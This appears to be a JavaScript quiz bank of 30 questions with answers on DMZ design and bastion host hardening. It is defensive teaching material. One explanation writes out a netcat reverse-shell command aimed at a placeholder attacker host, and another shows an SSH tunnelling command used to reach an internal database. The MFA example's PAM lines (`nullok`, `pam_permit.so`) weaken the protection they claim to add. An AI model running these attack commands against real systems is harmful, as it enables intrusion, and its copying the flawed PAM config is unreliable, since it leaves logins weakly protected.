const questions = [
  {
    id: 1,
    question: "What is the primary architectural objective of a Demilitarized Zone (DMZ) in enterprise network security?",
    shortAnswer: "To isolate public-facing services (Web, DNS, Mail) in a dedicated buffer subnet, ensuring that any compromise of a public server is strictly contained and prevented from accessing internal corporate databases or workstations.",
    explanation: "A DMZ acts as a quarantine buffer zone. External Internet users are permitted to access only servers residing in the DMZ. The internal firewall strictly blocks DMZ servers from initiating unsolicited connections to internal private networks, preventing lateral adversary pivoting.",
    hint: "An isolated buffer zone that contains breaches and prevents external hackers from reaching internal networks.",
    level: "Basic",
    codeExample: `// The DMZ Containment Principle:
// Internet ---> [External FW] ---> [DMZ Buffer (Web/DNS)] ---> [Internal FW (Blocks Lateral Access)] ---> [Internal Database Vault]`
  },
  {
    id: 2,
    question: "Which server types are PERMITTED to reside inside a DMZ and which are STRICTLY FORBIDDEN?",
    shortAnswer: "PERMITTED: Web reverse proxies, public authoritative DNS, external mail MTAs, SFTP jump gateways, Bastion hosts. FORBIDDEN: Production databases, Active Directory Domain Controllers, employee workstations, source code repositories.",
    explanation: "Any system containing sensitive personal data, corporate credentials, or broad network trust must reside inside the internal protected LAN. Placing a Domain Controller or database in the DMZ creates an unacceptable risk of immediate total domain compromise if the server is breached.",
    hint: "Public-facing proxies belong in the DMZ; databases and domain controllers belong in the private core.",
    level: "Basic",
    codeExample: `// DMZ Asset Placement Matrix:
const dmzAssets = {
  permitted: ["Web Reverse Proxy", "Public DNS", "Mail MTA", "Bastion Jump Host", "SFTP Gateway"],
  forbidden: ["Production Database", "Active Directory DC", "Employee Workstations", "Git Repositories"]
};`
  },
  {
    id: 3,
    question: "What is a 'Bastion Host' and what is its primary role in perimeter network architecture?",
    shortAnswer: "A heavily fortified, stripped-down server situated in the DMZ that serves as the single secure entry point for proxying public services or providing authenticated administrative access into internal networks.",
    explanation: "Bastion hosts are specifically configured to withstand continuous attack. They run minimal operating system components, lack developer tools, enforce multi-factor authentication, and stream audit telemetry in real-time to a central SIEM.",
    hint: "A fortified gateway server designed to withstand external attacks.",
    level: "Basic",
    codeExample: `// Bastion Host Definition:
// External Admin ---> [MFA SSH (Port 22)] ---> [Hardened Bastion Host (DMZ)] ---> [Internal Servers]`
  },
  {
    id: 4,
    question: "Why must build compilers (`gcc`, `g++`, `make`, `clang`) be removed from Bastion Hosts during OS hardening?",
    shortAnswer: "To prevent an attacker who achieves an unprivileged shell on the bastion from compiling local kernel privilege escalation exploits (e.g. Dirty COW, PwnKit) from C source code.",
    explanation: "Attackers frequently download C exploit source code to escalate privileges to root. Removing compilers and debuggers forces the attacker to bring pre-compiled binaries matching the exact kernel version and architecture, significantly raising the difficulty of exploitation.",
    hint: "Without compilers on the server, attackers cannot compile local root exploits.",
    level: "Moderate",
    codeExample: `// Compiler Removal on Hardened Linux Bastion:
// sudo apt-get remove --purge gcc g++ make clang gdb
// sudo yum remove gcc gcc-c++ make gdb`
  },
  {
    id: 5,
    question: "Why should `/tmp`, `/var/tmp`, and `/dev/shm` be mounted with `noexec,nosuid,nodev` options on DMZ servers?",
    shortAnswer: "To prevent attackers from executing downloaded malware binaries or running SUID privilege escalation exploits from world-writable temporary directories.",
    explanation: "Attackers commonly download exploit payloads into world-writable directories like `/tmp`. Mounting `/tmp` with `noexec` causes the Linux kernel to reject execution of any binary file located in that filesystem partition with 'Permission denied'.",
    hint: "Blocks running executable files from the world-writable /tmp folder.",
    level: "Moderate",
    codeExample: `// /etc/fstab Secure Mount Configuration:
// tmpfs   /tmp       tmpfs   defaults,noexec,nosuid,nodev   0 0
// tmpfs   /dev/shm   tmpfs   defaults,noexec,nosuid,nodev   0 0`
  },
  {
    id: 6,
    question: "What is 'Private VLAN (PVLAN)' isolation and why is it essential within a multi-server DMZ?",
    shortAnswer: "PVLANs partition a single DMZ subnet at Layer 2 so that DMZ servers connected to 'Isolated Ports' can communicate only with the default gateway firewall, blocking lateral East-West communication between DMZ servers.",
    explanation: "In a flat DMZ, if Web Server 1 is compromised, the attacker can scan and compromise the adjacent Mail Server or Bastion Host via local ARP and TCP scans. PVLANs block Layer 2 frame forwarding between switch ports, stopping lateral pivoting within the DMZ.",
    hint: "Prevents servers on the same switch from talking directly to each other, forcing all traffic through the firewall.",
    level: "Expert",
    codeExample: `// Cisco Switch PVLAN Configuration:
// vlan 200 (Primary DMZ VLAN)
// vlan 201 (Secondary Isolated VLAN)
// interface GigabitEthernet0/1
//  switchport mode private-vlan host
//  switchport private-vlan host-association 200 201`
  },
  {
    id: 7,
    question: "What is a 'Database Pinhole' in DMZ-to-LAN firewall policies and what security controls must govern it?",
    shortAnswer: "A tightly scoped firewall rule permitting a DMZ web application server to connect exclusively to the database server's specific IP on its database port (e.g. TCP 5432) using encrypted mutual TLS (mTLS).",
    explanation: "The pinhole rule must never use wildcards or subnet ranges. It must specify single `/32` host IPs: `ALLOW 172.16.1.10 -> 10.10.4.50:5432`. Connections must enforce mTLS client certificates so that an attacker without the certificate cannot query the database even if they gain shell access on the web server.",
    hint: "A strictly restricted opening allowing only the web server IP to reach the database IP on one port with mTLS.",
    level: "Moderate",
    codeExample: `// Database Pinhole Policy:
// ALLOW: host 172.16.1.10 -> host 10.10.4.50 eq 5432 Proto: TCP (mTLS Enforced)
// DROP : 172.16.1.0/24   -> 10.0.0.0/8 ANY (Blocks all other lateral traffic)`
  },
  {
    id: 8,
    question: "Why must SSH Password Authentication be disabled (`PasswordAuthentication no`) on Bastion Hosts?",
    shortAnswer: "To prevent automated dictionary and brute-force password guessing attacks from the Internet, requiring cryptographic Ed25519 keys or FIDO2 hardware tokens (YubiKeys) for all logins.",
    explanation: "Bastion hosts are attacked by automated botnets thousands of times daily. Disabling password authentication eliminates credential stuffing and dictionary attacks entirely, ensuring that only administrators possessing authorized cryptographic private keys can authenticate.",
    hint: "Disables passwords to defeat automated brute-force attacks.",
    level: "Basic",
    codeExample: `// /etc/ssh/sshd_config Hardening Directives:
// PasswordAuthentication no
// ChallengeResponseAuthentication no
// PubkeyAuthentication yes
// PermitRootLogin no`
  },
  {
    id: 9,
    question: "What is 'Immutable Remote Logging' (`rsyslog-tls` / SIEM) and why is it mandatory for Bastion Hosts?",
    shortAnswer: "Streaming audit and security logs in real-time over encrypted TLS to a remote, write-only SIEM collector so that evidence survives even if an attacker attains root access and wipes local log files.",
    explanation: "One of the first actions an attacker takes after attaining root privileges is erasing `/var/log/auth.log` and `/var/log/messages` to cover their tracks. Real-time remote log streaming ensures that tamper-proof forensic records are preserved for CERT-In investigation.",
    hint: "Sending logs to an off-box server in real-time so a hacker cannot delete them.",
    level: "Moderate",
    codeExample: `// rsyslog TLS Remote Streaming:
// *.* action(type="omfwd" target="siem.barrackpore.gov.in" port="6514" protocol="tcp" StreamDriver="gtls" StreamDriverMode="1")`
  },
  {
    id: 10,
    question: "What is a 'Privileged Access Workstation' (PAW) or Jump Box and how does it prevent credential theft?",
    shortAnswer: "A hardened, dedicated computer used exclusively for administrative tasks (server management, cloud administration), isolated from email, web browsing, and general office software to prevent credential dumping.",
    explanation: "Administrators must never perform server management from a laptop used for reading email or general web browsing (which can be infected by phishing malware). A PAW is a clean, dedicated machine used only for administrative jump box access with MFA.",
    hint: "A dedicated computer used only for administrative tasks, never for email or web browsing.",
    level: "Moderate",
    codeExample: `// PAW Architecture Hierarchy:
// Tier 0 (Domain Controllers / Cloud Root) <--- PAW Jump Host (MFA Only) <--- Tier 1 Server Admins`
  },
  {
    id: 11,
    question: "What is 'File Integrity Monitoring' (FIM - e.g. AIDE, Wazuh, OSSEC) on DMZ Bastion Hosts?",
    shortAnswer: "An automated daemon that monitors cryptographic SHA-256 hashes of critical system binaries (`/bin`, `/sbin`, `/etc`), alerting the SOC immediately if an attacker installs a rootkit, backdoor, or modifies system files.",
    explanation: "FIM creates a baseline cryptographic hash database of all system files. If an attacker modifies `/etc/passwd` or replaces `/bin/login` with a backdoor, the FIM engine detects the hash mismatch within seconds and triggers a high-severity SIEM alert.",
    hint: "Checking cryptographic hashes of system files to detect rootkits and unauthorized file edits.",
    level: "Moderate",
    codeExample: `// AIDE (Advanced Intrusion Detection Environment) Initialization:
// sudo aide --init
// sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
// sudo aide --check (Scans for modified binaries!)`
  },
  {
    id: 12,
    question: "Why should an enterprise NEVER run a public web server as the `root` superuser?",
    shortAnswer: "If an attacker achieves Remote Code Execution (RCE) via a web exploit, running as root grants the attacker immediate complete control of the operating system without requiring local privilege escalation.",
    explanation: "Web daemons (NGINX, Apache, Node.js) should always run under dedicated unprivileged service accounts (e.g. `www-data` or `nginx`) with minimal filesystem permissions and `nologin` shells, restricting an attacker's blast radius to the web root directory.",
    hint: "Running as an unprivileged user prevents an attacker from automatically getting full root access.",
    level: "Basic",
    codeExample: `// Non-Root Service Execution:
// useradd -r -s /usr/sbin/nologin www-data
// chown -R www-data:www-data /var/www/html`
  },
  {
    id: 13,
    question: "What is 'Dual-DMZ (Split DMZ)' design and how does it protect multi-tier e-commerce and banking applications?",
    shortAnswer: "An architecture with two distinct DMZ zones: External DMZ (Tier 1: Web presentation reverse proxies) and Internal Application DMZ (Tier 2: Business logic middleware), completely isolating web servers from backend databases.",
    explanation: "In a Dual-DMZ architecture, Web servers in DMZ 1 can only communicate with Application middleware in DMZ 2 via structured API endpoints (gRPC/REST). Web servers have zero network routes to the database, ensuring that an SQL injection or RCE exploit on the web tier cannot reach database storage directly.",
    hint: "Two separate DMZ tiers: one for web presentation, and a second for application middleware.",
    level: "Expert",
    codeExample: `// Dual-DMZ Layout:
// [Internet] -> (FW 1) -> [DMZ 1: Web Proxies] -> (FW 2) -> [DMZ 2: App Logic] -> (FW 3) -> [Internal Data Vault]`
  },
  {
    id: 14,
    question: "What is 'SSH Port Forwarding / Tunneling' and why do hardened Bastion Hosts disable it (`AllowTcpForwarding no`)?",
    shortAnswer: "SSH tunneling allows users to route arbitrary network traffic through the SSH connection; disabling it prevents attackers from using the bastion as an unmonitored proxy to reach segmented internal subnets.",
    explanation: "If `AllowTcpForwarding` is enabled, an attacker who compromises a user's SSH key can run `ssh -L 8080:internal-db:5432 bastion-user@bastion-ip`, opening a direct encrypted tunnel to the internal database that bypasses firewall inspection.",
    hint: "Disables SSH port forwarding to prevent attackers from tunneling hidden traffic into the network.",
    level: "Moderate",
    codeExample: `// /etc/ssh/sshd_config Tunneling Lockdown:
// AllowTcpForwarding no
// X11Forwarding no
// AllowAgentForwarding no`
  },
  {
    id: 15,
    question: "What is 'Session Recording and Keystroke Logging' in enterprise Privileged Access Management (PAM) Bastions?",
    shortAnswer: "Automatically recording complete video sessions and auditing every command and keystroke entered by administrators during remote maintenance sessions for accountability and forensic review.",
    explanation: "Tools like Teleport, Apache Guacamole, or CyberArk PAM record full terminal sessions and RDP screens. If an administrator executes an unauthorized command or data export, the video and text log serve as immutable legal evidence.",
    hint: "Recording video and text of every command an administrator types on production servers.",
    level: "Basic",
    codeExample: `// PAM Session Telemetry Record:
const pamAuditRecord = {
  sessionId: "sess_9921_barrackpore",
  adminUser: "sukanta.hui",
  targetHost: "prod-db-01.internal",
  commandsExecuted: ["sudo systemctl status postgresql", "tail -n 50 /var/log/postgresql.log"],
  recordingUrl: "https://pam.bank.gov.in/recordings/sess_9921.mp4"
};`
  },
  {
    id: 16,
    question: "What is 'Fail2ban / IP Rate-Limiting' on Bastion Hosts?",
    shortAnswer: "An automated daemon that monitors authentication logs (`/var/log/auth.log`), automatically adding IP addresses that fail 3–5 consecutive login attempts to a temporary firewall drop jail for 1–24 hours.",
    explanation: "Fail2ban dynamically updates `iptables` or `nftables` kernel tables to drop connection requests from attacking IP addresses, mitigating automated brute-force attacks and reducing system authentication load.",
    hint: "Automatically bans IP addresses that fail multiple password attempts.",
    level: "Basic",
    codeExample: `// Fail2ban Jail Configuration:
// [sshd]
// enabled = true
// maxretry = 3
// bantime = 86400 (24-hour ban)
// findtime = 600`
  },
  {
    id: 17,
    question: "What is 'Address Space Layout Randomization' (ASLR) and how does it harden Bastion Host memory?",
    shortAnswer: "A Linux kernel security feature that randomizes the memory address positions of the stack, heap, and libraries, preventing buffer overflow exploits from executing predictable shellcode.",
    explanation: "In an unrandomized system, return addresses and library functions (like `system()`) reside at predictable memory locations. ASLR randomizes these locations on every process launch, causing buffer overflow exploits to crash harmlessly with a Segmentation Fault rather than spawning a root shell.",
    hint: "Randomizing memory addresses so attackers cannot find predictable locations for buffer overflow exploits.",
    level: "Expert",
    codeExample: `// Enabling Strict ASLR in Linux Kernel:
// sudo sysctl -w kernel.randomize_va_space=2
// echo "kernel.randomize_va_space = 2" >> /etc/sysctl.conf`
  },
  {
    id: 18,
    question: "Why should Bastion Hosts be placed in an isolated, dedicated Management DMZ rather than the general Public Web DMZ?",
    shortAnswer: "To ensure that a compromise of the public web server container does not grant the attacker direct local network access to the administrative bastion jump server.",
    explanation: "If web servers and bastion jump boxes reside on the same flat DMZ subnet, an attacker who breaches the web server can launch local exploit scans against the bastion. Placing bastions in a dedicated Management DMZ with firewall mediation prevents lateral access.",
    hint: "Separating admin jump servers from public web servers so web hacks cannot target the admin portal.",
    level: "Moderate",
    codeExample: `// Multi-Zone Segmentation:
// Zone 1: Public DMZ (Web Reverse Proxy: 172.16.1.0/24)
// Zone 2: Management DMZ (Bastion Jump Host: 172.16.2.0/24)
// Zone 3: Internal Production LAN (Core Databases: 10.10.4.0/24)`
  },
  {
    id: 19,
    question: "What is 'Time-Based One-Time Password' (TOTP - RFC 6238) / FIDO2 MFA on SSH Bastion Gateways?",
    shortAnswer: "Requiring administrators to provide a second authentication factor (a rotating 6-digit TOTP code from an authenticator app or a hardware FIDO2 security key tap) in addition to their SSH private key.",
    explanation: "Even if an attacker steals an administrator's SSH private key from a compromised laptop, they cannot log into the Bastion Host without physical possession of the administrator's hardware YubiKey or TOTP authenticator device.",
    hint: "Requiring a hardware key tap or mobile authenticator code in addition to your SSH key.",
    level: "Basic",
    codeExample: `// PAM SSH Multi-Factor Authentication:
// auth required pam_google_authenticator.so nullok
// auth required pam_permit.so`
  },
  {
    id: 20,
    question: "What is 'Split-Horizon DNS' in DMZ Bastion deployments?",
    shortAnswer: "Public DNS servers in the DMZ resolve only external public IPs, while internal private DNS servers resolve internal hostnames, preventing external attackers from enumerating internal server names and IP schemes.",
    explanation: "Split-Horizon DNS prevents information disclosure: Internet users query `portal.barrackpore.gov.in` and receive public IP `203.0.113.10`, while internal staff query the same domain and receive private DMZ IP `172.16.1.10`, hiding all internal RFC 1918 addressing.",
    hint: "Public DNS resolves public IPs for the outside world; private DNS resolves internal IPs for employees.",
    level: "Moderate",
    codeExample: `// BIND Split-Horizon Views:
// view "external" { match-clients { any; }; zone "bank.gov.in" { ... }; };
// view "internal" { match-clients { 10.10.0.0/16; }; zone "bank.gov.in" { ... }; };`
  },
  {
    id: 21,
    question: "What is 'Egress Filtering from the DMZ' and why is it critical for stopping Reverse Shells and C2 Beacons?",
    shortAnswer: "Restricting outbound connections initiated by DMZ servers so they cannot open arbitrary outbound TCP/UDP connections to the Internet, blocking reverse shells and malware command-and-control beacons.",
    explanation: "When an attacker achieves Remote Code Execution (RCE) on a web server, their first step is running `nc -e /bin/sh attacker-ip 4444` (a reverse shell). If egress filtering blocks all outbound connections from DMZ servers except approved DNS and NTP ports, the reverse shell connection fails.",
    hint: "Blocking DMZ servers from opening outbound connections to the Internet stops reverse shells.",
    level: "Moderate",
    codeExample: `// DMZ Egress Lockdown Rule:
// ALLOW: DMZ_Servers -> Internal_NTP (UDP 123)
// ALLOW: DMZ_Servers -> Internal_DNS (UDP 53)
// DROP : DMZ_Servers -> Internet (ANY:ANY) (Blocks reverse shells!)`
  },
  {
    id: 22,
    question: "How does an enterprise enforce 'Just-in-Time' (JIT) Ephemeral Access on DMZ Bastion Hosts?",
    shortAnswer: "Administrative access is granted temporarily on-demand for a specific duration (e.g. 1 hour) with approved ticketing system integration (Jira/ServiceNow), automatically revoking SSH access when the window expires.",
    explanation: "Permanent 24/7 administrative access creates persistent attack surfaces. JIT access platforms dynamically generate short-lived SSH certificates valid for 60 minutes upon manager approval, eliminating standing privileges.",
    hint: "Granting temporary admin access for 1 hour that automatically expires when work is finished.",
    level: "Expert",
    codeExample: `// Short-Lived SSH Certificate Creation:
// ssh-keygen -s ca_key -I admin_mamata -V +1h -n root id_ed25519.pub (Valid for 1 Hour Only!)`
  },
  {
    id: 23,
    question: "What is 'SELinux in Enforcing Mode' and how does it contain web server compromises on Bastion Hosts?",
    shortAnswer: "Mandatory Access Control (MAC) that restricts processes to defined security contexts; an NGINX daemon running under `httpd_t` is confined to `/var/www` and blocked from reading `/etc/shadow` or executing `/bin/sh` even if running as root.",
    explanation: "Discretionary Access Control (standard Linux permissions) allows root to access everything. SELinux enforces strict kernel policy labels: even if an attacker achieves root privileges inside the web process, SELinux blocks the process from opening sockets, mounting filesystems, or accessing user home directories.",
    hint: "Mandatory kernel security controls that confine processes to their own folders even if compromised as root.",
    level: "Expert",
    codeExample: `// Enforcing SELinux:
// sudo setenforce 1
// getenforce -> Outputs: Enforcing`
  },
  {
    id: 24,
    question: "What is 'SFTP Gateway / Chrooted Jail' in secure DMZ file transfer architectures?",
    shortAnswer: "An isolated SFTP service that confines external users to a specific directory tree (`ChrootDirectory %h`) using `internal-sftp`, preventing shell access or directory traversal into the host operating system.",
    explanation: "External partners uploading tax or banking files connect to a dedicated DMZ SFTP gateway. The SSH daemon chroots the user into `/data/uploads/partner1`, denying access to `/bin`, `/etc`, or any other host files.",
    hint: "Locking file upload users into a single directory so they cannot see or access the rest of the server.",
    level: "Basic",
    codeExample: `// /etc/ssh/sshd_config SFTP Chroot:
// Match Group sftp_users
//   ChrootDirectory /data/sftp/%u
//   ForceCommand internal-sftp
//   AllowTcpForwarding no`
  },
  {
    id: 25,
    question: "Why must Bastion Host SSH banners NOT display legal disclaimers containing system version information?",
    shortAnswer: "Banners must warn unauthorized users of monitoring and legal prosecution under the IT Act 2000, but must NEVER disclose the Linux distribution, OpenSSH version, or server hostnames.",
    explanation: "Displaying `Welcome to Ubuntu 20.04.1 LTS OpenSSH 8.2` tells attackers the exact operating system and software version. Banners should display strict legal warnings: 'Authorized Access Only. All Activity Monitored and Logged under Section 43 of the IT Act 2000.'",
    hint: "Banners should display legal warnings without disclosing software version numbers.",
    level: "Basic",
    codeExample: `// /etc/issue.net Hardened Legal Warning Banner:
// "UNAUTHORIZED ACCESS PROHIBITED. All sessions are monitored and recorded. Violations prosecuted under the Indian IT Act 2000."`
  },
  {
    id: 26,
    question: "What is 'AppArmor Profile Confinement' on Debian / Ubuntu DMZ servers?",
    shortAnswer: "A Linux Security Module (LSM) that confines specific daemon binaries (e.g. `/usr/sbin/nginx`) to a strict whitelist of permitted files, capabilities, and network sockets, blocking unexpected behavior.",
    explanation: "If an unpatched buffer overflow occurs in NGINX, AppArmor prevents the compromised process from executing `/bin/dash` or reading `/root/.ssh/id_rsa`, killing the unauthorized action at the kernel level.",
    hint: "Restricts what files and commands a specific program is allowed to access.",
    level: "Moderate",
    codeExample: `// AppArmor Enforcement Command:
// sudo aa-enforce /etc/apparmor.d/usr.sbin.nginx
// sudo aa-status`
  },
  {
    id: 27,
    question: "What is 'Log Tampering Detection' via Write-Once Storage (WORM) in enterprise DMZ logging?",
    shortAnswer: "Storing log archives on Write-Once-Read-Many (WORM) storage or cryptographic hash-chained storage (e.g. AWS S3 Object Lock), making it mathematically impossible for attackers or rogue administrators to alter or delete logs.",
    explanation: "Under the DPDP Act 2023 and CERT-In directions, audit logs must be immutable. WORM storage locks log objects with compliance retention timers (e.g. 180 days), preventing modification even by the root cloud administrator.",
    hint: "Storage that can be written once but never modified or deleted, preserving tamper-proof logs.",
    level: "Moderate",
    codeExample: `// S3 Object Lock Compliance Policy:
// aws s3api put-object-lock-configuration --bucket certin-audit-logs --object-lock-configuration 'ObjectLockEnabled="Enabled",Rule={DefaultRetention={Mode="COMPLIANCE",Days=180}}'`
  },
  {
    id: 28,
    question: "How does a DMZ Bastion Host implement 'Port Knocking' or Single Packet Authorization (SPA) for stealth operations?",
    shortAnswer: "The bastion keeps SSH port 22 completely closed and silent until an authorized client transmits an encrypted, signed Single Packet Authorization (SPA) packet, which opens a dynamic firewall pinhole for that specific IP for 30 seconds.",
    explanation: "SPA tools (like `fwknop`) render the bastion completely invisible to automated Nmap port scanners. Port scanners see port 22 as filtered/closed. When an authorized administrator sends an encrypted SPA packet, the firewall opens port 22 exclusively for the administrator's IP address.",
    hint: "Keeping the SSH port completely invisible until an encrypted authorization knock is received.",
    level: "Expert",
    codeExample: `// Single Packet Authorization (fwknop):
// fwknop -n bastion.barrackpore.gov.in -a 198.51.100.25 --rc-file .fwknoprc
// Result: Port 22 opened for 30 seconds exclusively for 198.51.100.25!`
  },
  {
    id: 29,
    question: "What is 'Automated Patch Management' on DMZ servers and why is automated patching critical for perimeter defense?",
    shortAnswer: "Configuring automated unattended security upgrades (`unattended-upgrades` / yum-cron) to install critical kernel and security patches within 24 hours of release, closing zero-day vulnerability windows.",
    explanation: "Public-facing DMZ servers are scanned for newly published CVEs within hours of public disclosure. Automated patch management ensures that security updates for OpenSSH, OpenSSL, and the Linux kernel are applied automatically without waiting for manual maintenance cycles.",
    hint: "Automatically installing security updates within 24 hours to patch known vulnerabilities.",
    level: "Basic",
    codeExample: `// Ubuntu Unattended-Upgrades Configuration:
// sudo apt-get install unattended-upgrades
// sudo dpkg-reconfigure --priority=low unattended-upgrades`
  },
  {
    id: 30,
    question: "Synthesize the overarching best practices for Demilitarized Zone (DMZ) Design and Bastion Host hardening.",
    shortAnswer: "A resilient DMZ requires: complete isolation of public servers from internal databases; strict one-way pinhole access controls; Private VLAN (PVLAN) Layer 2 separation; stripped-down bastion hosts with SSH MFA and no compilers; and real-time immutable remote logging.",
    explanation: "By treating the DMZ as a hostile buffer zone and rigorously hardening all bastion hosts, organizations contain breaches at the perimeter, deny attackers lateral movement pathways, and protect sensitive core data assets in full compliance with modern cybersecurity standards.",
    hint: "Buffer isolation + PVLANs + Bastion hardening (MFA/No Compilers) + One-way pinholes + Immutable logs = Impenetrable DMZ.",
    level: "Moderate",
    codeExample: `// The Master DMZ Security Formula:
// Resilient DMZ = [Buffer Subnet Isolation] + [Private VLANs (PVLAN)] + [Hardened Bastion (MFA + No Compilers)] + [Encrypted mTLS Pinholes] + [180-Day WORM Logs]`
  }
];

export default questions;
